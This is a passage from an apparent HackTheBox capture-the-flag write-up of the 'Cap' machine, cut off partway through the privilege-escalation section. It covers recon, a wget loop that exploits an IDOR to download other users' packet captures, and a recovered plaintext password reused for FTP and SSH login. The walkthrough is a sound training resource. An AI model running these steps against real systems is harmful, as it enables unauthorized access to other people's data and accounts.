
<!DOCTYPE html>
<html lang="en"><head>

Cap provided a chance to exploit two simple yet interesting capabilities. First, there’s a website with an insecure direct object reference (IDOR) vulnerability, where the site will collect a PCAP for me, but I can also access other user’s PCAPs, to include one from the user of the box with their FTP credentials, which also provides SSH access as that user. With a shell, I’ll find that in order for the site to collect pcaps, it needs some privileges, which are provided via Linux capabilities, including one that I’ll abuse to get a shell as root.


<meta property="og:description" content="Cap provided a chance to exploit two simple yet interesting capabilities. First, there’s a website with an insecure direct object reference (IDOR) vulnerability, where the site will collect a PCAP for me, but I can also access other user’s PCAPs, to include one from the user of the box with their FTP credentials, which also provides SSH access as that user. With a shell, I’ll find that in order for the site to collect pcaps, it needs some privileges, which are provided via Linux capabilities, including one that I’ll abuse to get a shell as root." />
<link rel="canonical" href="https://0xdf.gitlab.io/2021/10/02/htb-cap.html" />
<meta property="og:url" content="https://0xdf.gitlab.io/2021/10/02/htb-cap.html" />
<meta property="og:site_name" content="0xdf hacks stuff" />
<meta property="og:image" content="https://0xdfimages.gitlab.io/img/cap-cover.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-10-02T13:45:00+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:image" content="https://0xdfimages.gitlab.io/img/cap-cover.png" />
<meta property="twitter:title" content="HTB: Cap" />
<meta name="twitter:site" content="@0xdf_" />
<script type="application/ld+json">

	Cap provided a chance to exploit two simple yet interesting capabilities. First, there’s a website with an insecure direct object reference (IDOR) vulnerability, where the site will collect a PCAP for me, but I can also access other user’s PCAPs, to include one from the user of the box with their FTP credentials, which also provides SSH access as that user. With a shell, I’ll find that in order for the site to collect pcaps, it needs some privileges, which are provided via Linux capabilities, including one that I’ll abuse to get a shell as root.", https://0xdf.gitlab.io/2021/10/02/htb-cap.html
 
<link rel="stylesheet" href="/assets/css/bootstrap-toc.min.css">
  <link rel="stylesheet" href="/assets/css/main.css">
  <link rel="stylesheet" href="/assets/css/custom.css"> 
  <link rel="stylesheet" href="/assets/css/buymeacoffee.css">
  
  <link rel="stylesheet" href="/assets/css/syntax.css">
  
<link type="application/atom+xml" rel="alternate" href="https://0xdf.gitlab.io/feed.xml" title="0xdf hacks stuff" /><!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-P056MVQVGM"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-P056MVQVGM');
</script>
<!--<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-120216868-1', 'auto');
ga('send', 'pageview');
</script>-->
  
<link rel="icon" type="image/png" href="/assets/icons/favicon-32x32.png" sizes="32x32" />
  <link rel="icon" type="image/png" href="/assets/icons/favicon-16x16.png" sizes="16x16" />
</head>

  <body data-spy="scroll" data-toggle="toc" data-offset="150">
  
<header class="site-header">

  <div class="wrapper"><a class="site-title" rel="author" href="/">0xdf hacks stuff</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger">
            <a class="page-link-site" href="/">Home</a>
<a class="page-link-site" href="/about">About Me</a><a class="page-link-site" href="/tags">Tags</a><a class="page-link-site" href="/cheatsheets/">Cheatsheets</a><a class="page-link-site bmc" href="https://youtube.com/@0xdf"><img src="/icons/youtube.png" class="svg-icon" alt="" />YouTube</a>
          <a class="page-link-site bmc" href="https://gitlab.com/0xdf/ctfscripts"><img src="/icons/gitlab.png" class="svg-icon" alt="" />Gitlab</a><a class="page-link-site bmc" href="/feed.xml"><img src="/icons/rss.png" class="svg-icon" alt="" /><span>feed</span></a><a class="page-link-site bmc" target="_blank"
href="https://www.buymeacoffee.com/0xdf"><img src="https://cdn.buymeacoffee.com/buttons/bmc-new-btn-logo.svg" alt="Buy me a coffee" style="-webkit-filter: drop-shadow(0px 0px 2px white); filter: drop-shadow(0px 0px 2px white);"></a>
        </div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">HTB: Cap</h1>
    <p class="post-meta">

<span class="tag-list"><a href="/tags#htb-cap" class="post-tag">htb-cap</a> <a href="/tags#hackthebox" class="post-tag">hackthebox</a> <a href="/tags#ctf" class="post-tag">ctf</a> <a href="/tags#nmap" class="post-tag">nmap</a> <a href="/tags#pcap" class="post-tag">pcap</a> <a href="/tags#idor" class="post-tag">idor</a> <a href="/tags#feroxbuster" class="post-tag">feroxbuster</a> <a href="/tags#wireshark" class="post-tag">wireshark</a> <a href="/tags#credentials" class="post-tag">credentials</a> <a href="/tags#capabilities" class="post-tag">capabilities</a> <a href="/tags#linpeas" class="post-tag">linpeas</a> </span><br/><br/>


<time class="dt-published" datetime="2021-10-02T13:45:00+00:00" itemprop="datePublished">Oct 2, 2021
      </time></p>

  </header>

  
  <div class="post-content e-content" itemprop="articleBody">
    <div class="row">
      <div class="col-sm-3">
        <div class="sticky-top">
            <p><a href="#" style="color: #e6e6e6; text-decoration: none;">HTB: Cap</a></p>
	    <!--https://afeld.github.io/bootstrap-toc/-->  
          <nav id="toc" data-toggle="toc"></nav>
        </div>
      </div>
      <div class="col-sm-9" id="postBody">
        
<picture>
    <source type="image/webp" srcset="https://0xdfimages.gitlab.io/img/cap-cover.webp" />
    <img loading="lazy" src="https://0xdfimages.gitlab.io/img/cap-cover.png" alt="Cap" style="float: right; margin-right:50px; margin-left:50px; height:120px;" class="include_image " />
</picture>

<p>Cap provided a chance to exploit two simple yet interesting capabilities. First, there’s a website with an insecure direct object reference (IDOR) vulnerability, where the site will collect a PCAP for me, but I can also access other user’s PCAPs, to include one from the user of the box with their FTP credentials, which also provides SSH access as that user. With a shell, I’ll find that in order for the site to collect pcaps, it needs some privileges, which are provided via Linux capabilities, including one that I’ll abuse to get a shell as root.</p>
<h2 id="box-info">Box Info</h2>

<!-- https://app.hackthebox.com/machines/351 -->

<table>
  <thead>
    <tr>
      <th>Name</th>
      <th style="text-align: right"><a href="https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Fcap" target="_blank" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9">Cap</a> <a href="https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Fcap" target="_blank"><picture style="float: right; padding-left: 20px;"><source type="image/webp" srcset="/icons/box-cap.webp" /> <img src="/icons/box-cap.png" alt="Cap" class="img-av" /></picture></a><br /><a href="https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Fcap" target="_blank" style="font-size: small; color: white;">Play on HackTheBox</a></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Release Date</td>
      <td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1400100165411905536">05 Jun 2021</a></td>
    </tr>
    <tr>
      <td>Retire Date</td>
      <td style="text-align: right">02 Oct 2021</td>
    </tr>
    <tr>
      <td>OS</td>
      <td style="text-align: right">Linux <picture><source type="image/webp" srcset="/icons/Linux.webp" /><img src="/icons/Linux.png" alt="Linux" class="img-os" /></picture></td>
    </tr>
    <tr>
      <td>Base Points</td>
      <td style="text-align: right"><span class="diff-Easy">Easy [20]</span></td>
    </tr>
    <tr>
      <td>Rated Difficulty</td>
      <td style="text-align: right"><picture><source type="image/webp" srcset="/img/cap-diff.webp" /><img src="/img/cap-diff.png" alt="Rated difficulty for Cap" style="display: unset;" /></picture></td>
    </tr>
    <tr>
      <td>Radar Graph</td>
      <td style="text-align: right"><picture><source type="image/webp" srcset="/img/cap-radar.webp" /><img src="/img/cap-radar.png" alt="Radar chart for Cap" style="display: unset;" /></picture></td>
    </tr>
    <tr>
      <td><picture><source type="image/webp" srcset="/icons/first-blood-user.webp" /><img src="/icons/first-blood-user.png" alt="First Blood User" style="display: unset" /></picture></td>
      <td style="text-align: right"><span class="blood-time">00:03:38</span><a href="https://app.hackthebox.com/users/139466" target="_blank" rel="noopener"><img alt="szymex73" src="https://www.hackthebox.com/badge/image/139466" style="display: unset" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" /><span class="user-text" style="display: none"> szymex73</span></a><br /></td>
    </tr>
    <tr>
      <td><picture><source type="image/webp" srcset="/icons/first-blood-root.webp" /><img src="/icons/first-blood-root.png" alt="First Blood Root" style="display: unset" /></picture></td>
      <td style="text-align: right"><span class="blood-time">00:04:44</span><a href="https://app.hackthebox.com/users/139466" target="_blank" rel="noopener"><img alt="szymex73" src="https://www.hackthebox.com/badge/image/139466" style="display: unset" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" /><span class="user-text" style="display: none"> szymex73</span></a><br /></td>
    </tr>
    <tr>
      <td>Creator</td>
      <td style="text-align: right"><a href="https://app.hackthebox.com/users/52045" target="_blank" rel="noopener"><img alt="InfoSecJack" src="https://www.hackthebox.com/badge/image/52045" style="display: unset" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" /><span class="user-text" style="display: none"> InfoSecJack</span></a><br /></td>
    </tr>
  </tbody>
</table>

<h2 id="recon">Recon</h2>

<h3 id="nmap">nmap</h3>

<p><code class="language-plaintext highlighter-rouge">nmap</code> found three open TCP ports, FTP (21), SSH (22) and HTTP (80):</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 <span class="nt">-oA</span> scans/nmap-alltcp 10.10.10.245
<span class="go">Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-22 06:50 EDT
Nmap scan report for 10.10.10.245
Host is up (0.088s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 12.00 seconds

</span><span class="gp">oxdf@parrot$</span><span class="w"> </span>nmap <span class="nt">-p</span> 21,22,80 <span class="nt">-sCV</span> <span class="nt">-oA</span> scans/nmap-tcpscripts 10.10.10.245       
<span class="go">Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-22 06:51 EDT
Nmap scan report for 10.10.10.245
Host is up (0.088s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    gunicorn                              
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 404 NOT FOUND                                    
|     Server: gunicorn                                                 
|     Date: Sat, 22 May 2021 10:51:48 GMT
|     Connection: close                                                
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     &lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;
|     &lt;title&gt;404 Not Found&lt;/title&gt;                                             
|     &lt;h1&gt;Not Found&lt;/h1&gt;               
|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;                         
|   GetRequest:                        
|     HTTP/1.0 200 OK                  
|     Server: gunicorn                 
|     Date: Sat, 22 May 2021 10:51:42 GMT                                      
|     Connection: close                
|     Content-Type: text/html; charset=utf-8                                   
|     Content-Length: 19386                                                    
|     &lt;!DOCTYPE html&gt;                  
|     &lt;html class="no-js" lang="en"&gt;                                           
|     &lt;head&gt;
...[snip]...
SF:eck\x20your\x20spelling\x20and\x20try\x20again\.&lt;/p&gt;\n");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 133.13 seconds
</span></code></pre></div></div>

<p>Based on the <a href="https://packages.ubuntu.com/search?keywords=openssh-server">OpenSSH</a> and <a href="https://packages.ubuntu.com/search?keywords=apache2">Apache</a> versions, the host is likely running Ubuntu Focal 20.04.</p>

<p><code class="language-plaintext highlighter-rouge">nmap</code> didn’t call out anonymous FTP access, and I confirmed that manually as well.</p>

<h3 id="website---tcp-80">Website - TCP 80</h3>

<h4 id="site">Site</h4>

<p>The website is a security dashboard:</p>

<picture>
    <source type="image/webp" srcset="https://0xdfimages.gitlab.io/img/image-20210522070007349.webp" />
    <img loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210522070007349.png" alt="image-20210522070007349" class="include_image " />
</picture>

<p>There’s a user named Nathan logged in, and the links in the drop down menu under that aren’t active:</p>

<picture>
    <source type="image/webp" srcset="https://0xdfimages.gitlab.io/img/image-20210522070048715.webp" />
    <img loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210522070048715.png" alt="image-20210522070048715" class="include_image " />
</picture>

<p>The menu on the left does expand and offers three additional pages in addition to the dashboard.</p>

<p>Security Snapshot (<code class="language-plaintext highlighter-rouge">/capture</code>) hangs for 5 seconds, and then redirects to <code class="language-plaintext highlighter-rouge">/data/5</code> where it returns a list of packets:</p>

<picture>
    <source type="image/webp" srcset="https://0xdfimages.gitlab.io/img/image-20210522070209222.webp" />
    <img loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210522070209222.png" alt="image-20210522070209222" class="include_image " />
</picture>

<p>If I visit <code class="language-plaintext highlighter-rouge">/capture</code> again (this time while running <code class="language-plaintext highlighter-rouge">feroxbuster</code>), now it’s at <code class="language-plaintext highlighter-rouge">/data/7</code> (and there are actual packets):</p>

<picture>
    <source type="image/webp" srcset="https://0xdfimages.gitlab.io/img/image-20210522070338508.webp" />
    <img loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210522070338508.png" alt="image-20210522070338508" class="include_image " />
</picture>

<p>The download button links to <code class="language-plaintext highlighter-rouge">/download/7</code>, and will download an actual PCAP file:</p>

<picture>
    <source type="image/webp" srcset="https://0xdfimages.gitlab.io/img/image-20210522070359072.webp" />
    <img loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210522070359072.png" alt="image-20210522070359072" class="include_image " />
</picture>

<p>The numbers on those downloads seem to increase each time and be globally shared across all users.</p>

<p>Looking in Wireshark, all the packets are between my IP and Cap. I had already started my directory brute force, and that’s what’s reflected in the PCAP, so it looks like a live capture.</p>

<p>IP Config (<code class="language-plaintext highlighter-rouge">/ip</code>) looks to print the results of <code class="language-plaintext highlighter-rouge">ifconfig</code>:</p>

<picture>
    <source type="image/webp" srcset="https://0xdfimages.gitlab.io/img/image-20210522070611604.webp" />
    <img loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210522070611604.png" alt="image-20210522070611604" class="include_image " />
</picture>

<p>Network Status (<code class="language-plaintext highlighter-rouge">/netstat</code>) does the same with <code class="language-plaintext highlighter-rouge">netstat</code>:</p>

<div style="max-height: 300px; overflow: hidden; position: relative; margin-bottom: 20px;">
  <a href="https://0xdfimages.gitlab.io/img/image-20210522070656698.png">
    <img src="https://0xdfimages.gitlab.io/img/image-20210522070656698.png" style="clip-path: polygon(0 0, 100% 0, 100% 260px, 49% 290px, 51% 270px, 0 300px); -webkit-clip-path: polygon(0 0, 100% 0, 100% 260px, 49% 290px, 51% 270px, 0 300px)" alt="image-20210522070656698" />
  </a>
  <div style="position: absolute; right: 20px; top: 275px"><a href="https://0xdfimages.gitlab.io/img/image-20210522070656698.png"><i>Click for full image</i></a></div>
</div>

<h4 id="directory-brute-force">Directory Brute Force</h4>

<p>I’ll run <a href="https://github.com/epi052/feroxbuster">FeroxBuster</a> against the site with no extensions since it’s using Python:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>feroxbuster <span class="nt">-u</span> http://10.10.10.245
<span class="go">
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.2.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.245
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.2.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
</span><span class="feroxbuster-green">200</span><span class="go">      355l     1055w    17447c http://10.10.10.245/ip
</span><span class="feroxbuster-yellow">302</span><span class="go">        4l       24w      220c http://10.10.10.245/capture
</span><span class="feroxbuster-yellow">302</span><span class="go">        4l       24w      208c http://10.10.10.245/data
[</span><span class="feroxbuster-yellow">####################</span><span class="go">] - 2m     29999/29999   0s      </span><span class="feroxbuster-green">found</span><span class="go">:3       </span><span class="feroxbuster-red">errors</span><span class="go">:0      
[</span><span class="feroxbuster-cyan">####################</span><span class="go">] - 1m     29999/29999   250/s   http://10.10.10.245
</span></code></pre></div></div>

<p>Nothing new here.</p>

<h2 id="shell-as-nathan">Shell as nathan</h2>

<h3 id="idor">IDOR</h3>

<p>An <a href="https://portswigger.net/web-security/access-control/idor">Insecure Direct Object Reference</a> (IDOR) is a vulnerability there an attacker can manipulate a url or parameter to a request to access objects that they were not intended to access. These bugs seem trivial, but are all over the place (like <a href="https://www.zdnet.com/article/bug-hunter-wins-researcher-of-the-month-award-for-dod-account-takeover-bug/">US Department of Defense</a>, <a href="https://grahamcluley.com/alex-salmonds-alba-party-website-leaks-data-in-idor-foul-up/">political party websites</a>, <a href="https://www.bleepingcomputer.com/news/security/typeform-fixes-zendesk-sell-form-data-hijacking-vulnerability/">ZenDesk</a>, and <a href="https://www.wired.com/story/parler-hack-data-public-posts-images-video/">Parler</a>).</p>

<p>In this case, I have a link to <code class="language-plaintext highlighter-rouge">/download/7</code>. But if I start to step back, I can find other PCAPs.</p>

<p>I’ll exploit this with a quick loop to get everything. If I notice that that number seems to one up, I’ll download until it fails, and then break, with the following loop:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>i <span class="k">in</span> <span class="o">{</span>0..500<span class="o">}</span><span class="p">;</span> <span class="k">do 
  </span>wget 10.10.10.245/download/<span class="k">${</span><span class="nv">i</span><span class="k">}</span> <span class="nt">-O</span> pcaps/<span class="k">${</span><span class="nv">i</span><span class="k">}</span>.pcap 2&gt;/dev/null <span class="o">||</span> <span class="nb">break</span><span class="p">;</span> 
<span class="k">done</span><span class="p">;</span>
</code></pre></div></div>

<p>I’ll loop over <code class="language-plaintext highlighter-rouge">i</code> from 0 to a large number I don’t expect to reach. For each, I’ll use <code class="language-plaintext highlighter-rouge">wget</code> to download and save the pcap in a folder. I’ll use <code class="language-plaintext highlighter-rouge">2&gt;/dev/null</code> to hide the <code class="language-plaintext highlighter-rouge">wget</code> output. <code class="language-plaintext highlighter-rouge">|| break</code> will check the return code from <code class="language-plaintext highlighter-rouge">wget</code>, and if it fails, it will exit the loop. This loop does assume no gaps, as the first time it fails to get a PCAP, it will break out of the loop. I could try a more forgiving loop if this one doesn’t find what I need.</p>

<p>This is also a good place to think about the scope of whatever you’re working on. As this is HTB, I’ll grab as much as I can. If this were a real world target I was working for a bug bounty, I’d want to be really careful about the scope, and maybe only grab a couple bits of other’s data to limit the amount of PII or other sensitive data I collected.</p>

<p>I’ll add a <code class="language-plaintext highlighter-rouge">rm</code> at the end to remove the last failed download attempt. It works:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="k">for </span>i <span class="k">in</span> <span class="o">{</span>0..500<span class="o">}</span> <span class="p">;</span> <span class="k">do </span>wget 10.10.10.245/download/<span class="k">${</span><span class="nv">i</span><span class="k">}</span> <span class="nt">-O</span> pcaps/<span class="k">${</span><span class="nv">i</span><span class="k">}</span>.pcap 2&gt;/dev/null <span class="o">||</span> <span class="nb">break</span><span class="p">;</span> <span class="k">done</span><span class="p">;</span> <span class="nb">rm </span>pcaps/<span class="k">${</span><span class="nv">i</span><span class="k">}</span>.pcap
<span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">ls </span>pcaps/
<span class="go">0.pcap  1.pcap  2.pcap  3.pcap  4.pcap  5.pcap  6.pcap  7.pcap  8.pcap  9.pcap
</span></code></pre></div></div>

<h3 id="pcap-analysis">PCAP Analysis</h3>

<p>In <code class="language-plaintext highlighter-rouge">0.pcap</code>, there are a few TCP streams. One is a GET request for what looks like a PCAP analyzer site. The next two are the CSS and Favicon for that site.</p>

<p>Then there’s an FTP session containing a password for nathan (the same username as the website):</p>

<picture>
    <source type="image/webp" srcset="https://0xdfimages.gitlab.io/img/image-20210523112832362.webp" />
    <img loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20210523112832362.png" alt="image-20210523112832362" class="include_image " />
</picture>

<h3 id="ftp">FTP</h3>

<p>The password “Buck3tH4TF0RM3!” works to connect to FTP on Cap as nathan:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>ftp 10.10.10.245
<span class="go">Connected to 10.10.10.245.
220 (vsFTPd 3.0.3)
Name (10.10.10.245:oxdf): nathan
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
</span><span class="gp">ftp&gt;</span><span class="w">
</span></code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">dir</code> shows only one file I can access:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ftp&gt;</span><span class="w"> </span><span class="nb">dir</span>
<span class="go">200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-------    1 1001     1001           33 May 15 21:40 user.txt
226 Directory send OK
</span></code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">ls -la</code> actually shows the FTP root is in what looks like a home directory:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ftp&gt;</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span>
<span class="go">200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 1001     1001         4096 May 27 09:16 .
drwxr-xr-x    3 0        0            4096 May 23 19:17 ..
</span><span class="gp">lrwxrwxrwx    1 0        0               9 May 15 21:40 .bash_history -&gt;</span><span class="w"> </span>/dev/null
<span class="go">-rw-r--r--    1 1001     1001          220 Feb 25  2020 .bash_logout
-rw-r--r--    1 1001     1001         3771 Feb 25  2020 .bashrc
drwx------    2 1001     1001         4096 May 23 19:17 .cache
-rw-r--r--    1 1001     1001          807 Feb 25  2020 .profile
</span><span class="gp">lrwxrwxrwx    1 0        0               9 May 27 09:16 .viminfo -&gt;</span><span class="w"> </span>/dev/null
<span class="go">-r--------    1 1001     1001           33 Oct 02 07:24 user.txt
226 Directory send OK.
</span></code></pre></div></div>

<p>I can grab <code class="language-plaintext highlighter-rouge">user.txt</code>, completing the user half of the box:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">ftp&gt;</span><span class="w"> </span>get user.txt
<span class="go">local: user.txt remote: user.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for user.txt (33 bytes).
226 Transfer complete.
33 bytes received in 0.00 secs (13.8848 kB/s)
</span><span class="gp">ftp&gt;</span><span class="w"> 
</span><span class="go">221 Goodbye.
</span><span class="gp">oxdf@parrot$</span><span class="w"> </span><span class="nb">cat </span>user.txt
<span class="go">b610b8fa************************
</span></code></pre></div></div>

<h3 id="ssh">SSH</h3>

<p>The same password works for SSH as nathan as well:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@parrot$</span><span class="w"> </span>sshpass <span class="nt">-p</span> <span class="s1">'Buck3tH4TF0RM3!'</span> ssh nathan@10.10.10.245
<span class="go">...[snip]...
</span><span class="gp">nathan@cap:~$</span><span class="w">
</span></code></pre></div></div>

<h2 id="shell-as-root">Shell as root</h2>

<h3 id="enumeration">Enumeration</h3>

<h4 id="source-analysis">Source Analysis</h4>

<p>With not much in the user’s home directory and no other users, I’ll turn back to looking at the webapp. It’s a flask app with a handful of routes. It defines a variable at the top, <code class="language-plaintext highlighter-rouge">pcapid = 0</code>, that is used globally to store new pcaps. The <code class="language-plaintext highlighter-rouge">/capture</code> route was interesting:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@app.route</span><span class="p">(</span><span class="sh">"</span><span class="s">/capture</span><span class="sh">"</span><span class="p">)</span>
<span class="nd">@limiter.limit</span><span class="p">(</span><span class="sh">"</span><span class="s">1 per minute</span><span class="sh">"</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">capture</span><span class="p">():</span>
        <span class="n">os</span><span class="p">.</span><span class="nf">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

        <span class="nf">get_lock</span><span class="p">()</span>
        <span class="n">pcapid</span> <span class="o">=</span> <span class="nf">get_appid</span><span class="p">()</span>
        <span class="nf">increment_appid</span><span class="p">()</span>
        <span class="nf">release_lock</span><span class="p">()</span>

        <span class="n">path</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="nf">join</span><span class="p">(</span><span class="n">app</span><span class="p">.</span><span class="n">root_path</span><span class="p">,</span> <span class="sh">"</span><span class="s">upload</span><span class="sh">"</span><span class="p">,</span> <span class="nf">str</span><span class="p">(</span><span class="n">pcapid</span><span class="p">)</span> <span class="o">+</span> <span class="sh">"</span><span class="s">.pcap</span><span class="sh">"</span><span class="p">)</span>
        <span class="n">ip</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">remote_addr</span>
        <span class="n">command</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">timeout 5 tcpdump -w </span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s"> -i any host </span><span class="si">{</span><span class="n">ip</span><span class="si">}</span><span class="sh">"</span>
        <span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>

        <span class="n">os</span><span class="p">.</span><span class="nf">setuid</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span>
        <span class="k">return</span> <span class="nf">redirect</span><span class="p">(</span><span class="sh">"</span><span class="s">/data/</span><span class="sh">"</span> <span class="o">+</span> <span class="nf">str</span><span class="p">(</span><span class="n">pcapid</span><span class="p">))</span>
</code></pre></div></div>

<p>It is using <code class="language-plaintext highlighter-rouge">os.system</code> to call <code class="language-plaintext highlighter-rouge">tcpdump</code> with a five second timeout and save it in the <code class="language-plaintext highlighter-rouge">upload</code> directory with the current <code class="language-plaintext highlighter-rouge">pcapid</code> and the <code class="language-plaintext highlighter-rouge">.pcap</code> extension. Any time I see Python calling <code class="language-plaintext highlighter-rouge">os.system</code>, my first thought is to look for command injections. But the command passed to <code class="language-plaintext highlighter-rouge">system</code> doesn’t contain any user supplied variables, so that’s out.</p>

<p>Still, to call <code class="language-plaintext highlighter-rouge">tcpdump</code> like that, the user must be root, or have certain capabilities. The Python is calling <code class="language-plaintext highlighter-rouge">os.seduid(0)</code> at the start of the function. That will effectively make it root.</p>

<p>Not any application can call <code class="language-plaintext highlighter-rouge">setuid(0)</code>. It must be a privileged process. But the web process is running as nathan:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nathan     23827  0.0  1.0  26736 21528 ?        Ss   May22   0:11 /usr/bin/python3 /usr/local/bin/gunicorn app:app -b 0.0.0.0:80
nathan     87830  0.0  1.7 115920 34128 ?        S    15:08   0:00 /usr/bin/python3 /usr/local/bin/gunicorn app:app -b 0.0.0.0:80
</code></pre></div></div>

<p>Nothing interesting about the permissions on <code class="language-plaintext highlighter-rouge">app.py</code>:</p>

